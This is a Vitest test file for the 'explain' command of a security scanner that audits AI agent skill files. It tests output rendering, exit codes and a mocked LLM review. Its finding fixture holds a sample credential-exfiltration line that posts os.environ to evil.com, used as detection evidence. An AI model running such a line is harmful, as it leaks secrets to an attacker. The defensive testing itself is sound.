import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import stripAnsi from './helpers/strip-ansi.js';
import type { LlmReviewFetch } from '../packages/cli/src/llm/review.js';
import type { Enrichment, Finding, Skill, SkillSummary } from '../packages/cli/src/types.js';

vi.mock('../packages/cli/src/discovery/index.js', () => ({
  clearPlugins: vi.fn(),
  initDefaultPlugins: vi.fn(),
  discoverAll: vi.fn(),
}));

vi.mock('../packages/cli/src/rules/engine.js', () => ({
  runRules: vi.fn(),
  runRulesForSkill: vi.fn(),
}));

vi.mock('../packages/cli/src/rules/index.js', () => ({
  ALL_RULES: [],
}));

vi.mock('../packages/cli/src/enrich/index.js', () => ({
  ENRICHMENT_ENABLED: false,
  enrichSkillWithOutcomes: vi.fn(),
  enrichAll: vi.fn(),
  skippedEnrichmentOutcomes: vi.fn((sources: string[]) =>
    sources.map((source) => ({
      source,
      status: 'skipped-offline',
      reason: 'offline mode is active',
    }))
  ),
  summarizeEnrichmentOutcomes: vi.fn((outcomes: Array<{ status: string }>) => {
    if (outcomes.some((o) => o.status === 'found' || o.status === 'stale-cache')) return 'found';
    if (outcomes.some((o) => o.status === 'unavailable')) return 'unavailable';
    return 'no-metadata';
  }),
}));

vi.mock('../packages/cli/src/score.js', () => ({
  scoreFindings: vi.fn(),
}));

vi.mock('../packages/cli/src/output/json.js', () => ({
  renderJson: vi.fn((result: unknown) => JSON.stringify(result)),
}));

vi.mock('../packages/cli/src/progress.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../packages/cli/src/progress.js')>();
  return {
    ...actual,
    createProgressReporter: vi.fn(actual.createProgressReporter),
  };
});

import { discoverAll } from '../packages/cli/src/discovery/index.js';
import { enrichSkillWithOutcomes } from '../packages/cli/src/enrich/index.js';
import { createProgressReporter } from '../packages/cli/src/progress.js';
import { runRulesForSkill as runRules } from '../packages/cli/src/rules/engine.js';
import { scoreFindings } from '../packages/cli/src/score.js';
import { runExplain } from '../packages/cli/src/commands/explain.js';

function makeSkill(overrides: Partial<Skill> = {}): Skill {
  return {
    id: 'skill-abc',
    agentId: 'claude-code',
    name: 'test-skill',
    path: '/home/user/.claude/skills/test-skill',
    manifestPath: null,
    format: 'SKILL.md',
    scope: 'user',
    treeSha256: 'deadbeef',
    ...overrides,
  };
}

function makeSummary(overrides: Partial<SkillSummary> = {}): SkillSummary {
  return {
    critical: 0,
    high: 0,
    medium: 0,
    low: 0,
    info: 0,
    score: 100,
    verdict: 'PASS',
    mandatoryFail: [],
    allowlisted: false,
    ...overrides,
  };
}

function makeFinding(overrides: Partial<Finding> = {}): Finding {
  return {
    ruleId: 'NET-EXFIL-ENV',
    severity: 'critical',
    category: 'network-exfil',
    file: 'SKILL.md',
    line: 14,
    column: 1,
    snippet: 'requests.post("http://evil.com", json=dict(os.environ))',
    message: 'Outbound HTTP transmission of os.environ.',
    fix: 'Remove credential exfiltration.',
    cwe: ['CWE-200'],
    ...overrides,
  };
}

function makeEnrichmentResult(enrichment: Enrichment = {}) {
  return {
    enrichment,
    outcomes: [
      {
        source: 'skillsSh' as const,
        status: enrichment.skillsSh === undefined ? ('no-metadata' as const) : ('found' as const),
      },
      {
        source: 'github' as const,
        status: enrichment.github === undefined ? ('no-metadata' as const) : ('found' as const),
      },
      {
        source: 'depsdev' as const,
        status: enrichment.depsdev === undefined ? ('no-metadata' as const) : ('found' as const),
      },
    ],
  };
}

function mockProcessExit() {
  return vi.spyOn(process, 'exit').mockImplementation((() => {
    throw new Error('process.exit called');
  }) as never);
}

describe('runExplain', () => {
  let stdoutChunks: string[];
  let stderrChunks: string[];
  let processExitSpy: ReturnType<typeof mockProcessExit>;
  const originalXdgConfigHome = process.env['XDG_CONFIG_HOME'];

  beforeEach(() => {
    stdoutChunks = [];
    stderrChunks = [];
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => {
      stdoutChunks.push(String(chunk));
      return true;
    });
    vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => {
      stderrChunks.push(String(chunk));
      return true;
    });
    processExitSpy = mockProcessExit();
  });

  afterEach(() => {
    if (originalXdgConfigHome === undefined) {
      delete process.env['XDG_CONFIG_HOME'];
    } else {
      process.env['XDG_CONFIG_HOME'] = originalXdgConfigHome;
    }
    vi.restoreAllMocks();
  });

  async function withTempDir<T>(fn: (dir: string) => Promise<T>): Promise<T> {
    const dir = await mkdtemp(join(tmpdir(), 'skill-audit-explain-'));
    try {
      return await fn(dir);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }

  async function writeLlmConfig(configDir: string): Promise<void> {
    const llmDir = join(configDir, 'skill-audit');
    await mkdir(llmDir, { recursive: true });
    await writeFile(
      join(llmDir, 'llms.json'),
      JSON.stringify(
        {
          version: 1,
          models: [
            {
              name: 'reviewer',
              provider: 'openai-compatible',
              baseUrl: 'http://localhost:11434',
              model: 'local-reviewer',
              timeoutMs: 1000,
              contextTokens: 800,
            },
          ],
        },
        null,
        2
      ),
      'utf-8'
    );
  }

  async function withTtyStreams<T>(fn: () => Promise<T>): Promise<T> {
    const originalStdoutIsTty = process.stdout.isTTY;
    const originalStderrIsTty = process.stderr.isTTY;
    const originalCi = process.env['CI'];
    const originalTerm = process.env['TERM'];
    Object.defineProperty(process.stdout, 'isTTY', { value: true, configurable: true });
    Object.defineProperty(process.stderr, 'isTTY', { value: true, configurable: true });
    delete process.env['CI'];
    process.env['TERM'] = 'xterm-256color';
    try {
      return await fn();
    } finally {
      if (originalCi === undefined) {
        delete process.env['CI'];
      } else {
        process.env['CI'] = originalCi;
      }
      if (originalTerm === undefined) {
        delete process.env['TERM'];
      } else {
        process.env['TERM'] = originalTerm;
      }
      Object.defineProperty(process.stdout, 'isTTY', {
        value: originalStdoutIsTty,
        configurable: true,
      });
      Object.defineProperty(process.stderr, 'isTTY', {
        value: originalStderrIsTty,
        configurable: true,
      });
    }
  }

  it('renders skill name as header when found by exact name match', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('test-skill');
    expect(out).toContain('Agent:     Claude Code');
    expect(out).toContain('PASS');
  });

  it('lists every agent for a deduped multi-agent skill in human and JSON output', async () => {
    vi.mocked(discoverAll).mockResolvedValue([
      makeSkill({
        agentIds: ['claude-code', 'codex', 'copilot'],
        agentPaths: [
          { agentId: 'claude-code', path: '/home/user/.claude/skills/test-skill' },
          { agentId: 'codex', path: '/home/user/.codex/skills/test-skill' },
          { agentId: 'copilot', path: '/home/user/.github/skills/test-skill' },
        ],
        alsoInstalledAt: [
          '/home/user/.codex/skills/test-skill',
          '/home/user/.github/skills/test-skill',
        ],
      }),
    ]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());

    await runExplain('test-skill', { offline: true });

    let out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('Agent:     Claude Code, OpenAI Codex, GitHub Copilot');
    expect(out).toContain('Path:      Claude Code: /home/user/.claude/skills/test-skill');
    expect(out).toContain('OpenAI Codex: /home/user/.codex/skills/test-skill');
    expect(out).toContain('GitHub Copilot: /home/user/.github/skills/test-skill');
    expect(out).toContain('skill-audit scan --skill test-skill --json');

    stdoutChunks = [];
    await runExplain('test-skill', { offline: true, json: true });

    out = stripAnsi(stdoutChunks.join(''));
    const parsed = JSON.parse(out);
    expect(parsed.agents.map((agent: { id: string }) => agent.id)).toEqual([
      'claude-code',
      'codex',
      'copilot',
    ]);
    expect(parsed.skills[0].agentPaths).toEqual([
      { agentId: 'claude-code', path: '/home/user/.claude/skills/test-skill' },
      { agentId: 'codex', path: '/home/user/.codex/skills/test-skill' },
      { agentId: 'copilot', path: '/home/user/.github/skills/test-skill' },
    ]);
  });


  it('renders findings sorted by severity', async () => {
    const findings = [
      makeFinding({ ruleId: 'FS-DOTENV-READ', severity: 'medium' }),
      makeFinding({ ruleId: 'NET-EXFIL-ENV', severity: 'critical' }),
    ];
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue(findings);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary({ critical: 1, medium: 1, score: 72, verdict: 'REVIEW' }));
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    const critIdx = out.indexOf('NET-EXFIL-ENV');
    const medIdx = out.indexOf('FS-DOTENV-READ');
    expect(critIdx).toBeLessThan(medIdx);
  });

  it('exits with code 1 when verdict is FAIL', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([makeFinding()]);
    vi.mocked(scoreFindings).mockReturnValue(
      makeSummary({ critical: 1, score: 0, verdict: 'FAIL', mandatoryFail: ['NET-EXFIL-ENV'] })
    );
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await expect(runExplain('test-skill', { offline: true })).rejects.toThrow('process.exit called');
    expect(processExitSpy).toHaveBeenCalledWith(1);
  });

  it('exits with code 1 when skill not found', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill({ name: 'other-skill' })]);

    await expect(runExplain('nonexistent', { offline: true })).rejects.toThrow('process.exit called');
    expect(processExitSpy).toHaveBeenCalledWith(1);
    const err = stripAnsi(stderrChunks.join(''));
    expect(err).toContain('nonexistent');
    expect(err).toContain('skill-audit list');
  });

  it('shows "No issues found" when findings are empty and verdict is PASS', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('No issues found');
  });

  it('renders rm -rf next step when verdict is FAIL', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([makeFinding()]);
    vi.mocked(scoreFindings).mockReturnValue(
      makeSummary({ critical: 1, score: 0, verdict: 'FAIL', mandatoryFail: ['NET-EXFIL-ENV'] })
    );
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await expect(runExplain('test-skill', { offline: true })).rejects.toThrow('process.exit called');

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('rm -rf');
  });

  it('--json emits parseable JSON and does not call process.exit', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true, json: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(() => JSON.parse(out)).not.toThrow();
    const parsed = JSON.parse(out);
    expect(parsed.schema_version ?? parsed.schemaVersion).toBeTruthy();
    expect(processExitSpy).not.toHaveBeenCalled();
  });

  it('--json includes security-education context hints for likely security skills', async () => {
    vi.mocked(discoverAll).mockResolvedValue([
      makeSkill({ name: 'security-auditor', path: '/tmp/security-auditor' }),
    ]);
    vi.mocked(runRules).mockResolvedValue([makeFinding()]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary({ critical: 1, info: 1, score: 75 }));

    await runExplain('security-auditor', { offline: true, json: true });

    const parsed = JSON.parse(stripAnsi(stdoutChunks.join('')));
    const findings = parsed.skills[0].findings as Array<{ ruleId: string }>;
    expect(findings.map((finding) => finding.ruleId)).toEqual([
      'NET-EXFIL-ENV',
      'CTX-SECURITY-EDUCATION',
    ]);
    expect(scoreFindings).toHaveBeenCalledWith(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: 'NET-EXFIL-ENV' }),
        expect.objectContaining({ ruleId: 'CTX-SECURITY-EDUCATION', severity: 'info' }),
      ]),
      'deadbeef'
    );
  });

  it('matches skill by case-insensitive partial name', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill({ name: 'MyComplexSkill' })]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('complex', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('MyComplexSkill');
  });

  it('does not run or render enrichment while disabled', async () => {
    const enrichment: Enrichment = {
      github: { stars: 3, ageDays: 10, contributors: 2 },
    };
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult(enrichment));

    await runExplain('test-skill', {});

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('Enrichment');
    expect(out).not.toContain('3 stars');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('does not render disabled GitHub enrichment contributors', async () => {
    const enrichment: Enrichment = {
      github: { stars: 3, ageDays: 10, contributors: null },
    };
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult(enrichment));

    await runExplain('test-skill', {});

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('contributors unknown');
    expect(out).not.toContain('0 contributors');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('does not explain disabled enrichment when metadata would be absent', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', {});

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('Enrichment');
    expect(out).not.toContain('skills.sh');
    expect(out).not.toContain('deps.dev');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('does not explain disabled enrichment when lookup would be unavailable', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue({
      enrichment: {},
      outcomes: [
        { source: 'skillsSh', status: 'unavailable' },
        { source: 'github', status: 'unavailable' },
        { source: 'depsdev', status: 'unavailable' },
      ],
    });

    await runExplain('test-skill', {});

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('Enrichment');
    expect(out).not.toContain('skills.sh');
    expect(out).not.toContain('deps.dev');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('hidden --offline compatibility flag does not mention enrichment', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).not.toContain('offline mode is active');
    expect(out).not.toContain('Enrichment');
    expect(enrichSkillWithOutcomes).not.toHaveBeenCalled();
  });

  it('shows finding snippet with pipe-prefix lines', async () => {
    const finding = makeFinding({ snippet: 'line one\nline two' });
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([finding]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary({ critical: 1, score: 75, verdict: 'REVIEW' }));
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('│');
    expect(out).toContain('line one');
    expect(out).toContain('line two');
  });

  it('labels finding detail lines in human output', async () => {
    vi.mocked(discoverAll).mockResolvedValue([makeSkill()]);
    vi.mocked(runRules).mockResolvedValue([makeFinding()]);
    vi.mocked(scoreFindings).mockReturnValue(makeSummary({ critical: 1, score: 75, verdict: 'REVIEW' }));
    vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());

    await runExplain('test-skill', { offline: true });

    const out = stripAnsi(stdoutChunks.join(''));
    expect(out).toContain('Location: SKILL.md:14');
    expect(out).toContain('Evidence:');
    expect(out).toContain('Issue: Outbound HTTP transmission of os.environ.');
    expect(out).toContain('Fix: Remove credential exfiltration.');
  });

  it('--llm reviews the explained skill with the configured local model', async () => {
    await withTempDir(async (dir) => {
      process.env['XDG_CONFIG_HOME'] = dir;
      await writeLlmConfig(dir);
      vi.mocked(discoverAll).mockResolvedValue([
        makeSkill({ name: 'test-skill', path: '/tmp/test-skill' }),
        makeSkill({ id: 'other', name: 'other-skill', path: '/tmp/other-skill' }),
      ]);
      vi.mocked(runRules).mockResolvedValue([makeFinding({ file: '/tmp/test-skill/SKILL.md' })]);
      vi.mocked(scoreFindings).mockReturnValue(
        makeSummary({ critical: 1, score: 75, verdict: 'REVIEW' })
      );
      vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());
      const calls: Array<{ url: string; body: Record<string, unknown> }> = [];
      const fetchImpl: LlmReviewFetch = async (url, init) => {
        calls.push({ url, body: JSON.parse(init.body) as Record<string, unknown> });
        return {
          ok: true,
          status: 200,
          json: async () => ({
            choices: [
              {
                message: {
                  content: JSON.stringify({
                    findings: [
                      {
                        severity: 'high',
                        category: 'prompt-injection',
                        confidence: 0.9,
                        rationale: 'The model found an override instruction.',
                        file: 'SKILL.md',
                        suggested_fix: 'Delete the override.',
                      },
                    ],
                  }),
                },
              },
            ],
          }),
        };
      };
      const options = { llm: 'reviewer', llmFetchImpl: fetchImpl };

      await runExplain('test-skill', options);

      expect(calls).toHaveLength(1);
      expect(calls[0]?.url).toBe('http://localhost:11434/v1/chat/completions');
      const request = calls[0]?.body as { messages?: Array<{ role: string; content: string }> };
      const userMessage = request.messages?.find((message) => message.role === 'user');
      const payload = JSON.parse(userMessage?.content ?? '{}').payload as {
        skill: { name: string };
      };
      expect(payload.skill.name).toBe('test-skill');

      const out = stripAnsi(stdoutChunks.join(''));
      expect(out).toContain('LLM Review');
      expect(out).toContain('reviewer');
      expect(out).toContain('The model found an override instruction.');
      expect(out).toContain('Delete the override.');

      const errOut = stripAnsi(stderrChunks.join(''));
      expect(errOut).toContain('LLM review: reviewer');
      expect(errOut).toContain('LLM review 1/1: test-skill: ❌ 1 LLM finding');
      expect(errOut).not.toContain('LLM review: details:');
      expect(runRules).toHaveBeenCalledTimes(1);
    });
  });

  it('--llm does not show discovery or scan progress banners for explain details', async () => {
    await withTempDir(async (dir) => {
      process.env['XDG_CONFIG_HOME'] = dir;
      await writeLlmConfig(dir);
      vi.mocked(discoverAll).mockResolvedValue([
        makeSkill({ name: 'test-skill', path: '/tmp/test-skill' }),
        makeSkill({ id: 'other', name: 'other-skill', path: '/tmp/other-skill' }),
      ]);
      vi.mocked(runRules).mockResolvedValue([]);
      vi.mocked(scoreFindings).mockReturnValue(makeSummary());
      vi.mocked(enrichSkillWithOutcomes).mockResolvedValue(makeEnrichmentResult());
      const fetchImpl: LlmReviewFetch = async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          choices: [{ message: { content: JSON.stringify({ findings: [] }) } }],
        }),
      });

      await withTtyStreams(() => runExplain('test-skill', { llm: 'reviewer', llmFetchImpl: fetchImpl }));

      const out = stripAnsi(stdoutChunks.join(''));
      const err = stripAnsi(stderrChunks.join(''));
      expect(out).toContain('test-skill');
      expect(`${out}\n${err}`).not.toContain('Found 2 skills across');
      expect(`${out}\n${err}`).not.toContain('Scan complete: 1 skill checked');
      expect(`${out}\n${err}`).not.toContain('LLM review complete: 1 skill reviewed');
      expect(createProgressReporter).toHaveBeenCalledWith({ mode: 'silent' });
    });
  });
});
